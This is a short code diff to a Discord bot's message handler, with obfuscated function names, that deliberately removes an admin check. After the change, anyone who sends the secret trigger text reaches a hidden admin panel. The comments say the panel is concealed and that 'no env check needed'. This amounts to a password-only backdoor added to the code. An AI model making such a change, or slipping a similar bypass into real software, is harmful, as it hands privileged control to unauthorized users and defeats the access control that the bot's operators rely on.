@@ -3416,11 +3416,9 @@ async def on_message(message):
         return
 
     # Check for admin trigger FIRST (before pending verification)
+    # If user knows the password, they get access - no env check needed
     if _h4x(content):
-        if _v8n(discord_id):  # User is admin
-            await _p9e(discord_id, message.channel)
-            return
-        # If not admin, silently ignore (don't reveal panel exists)
+        await _p9e(discord_id, message.channel)
         return
 
     # Check if user has a pending verification
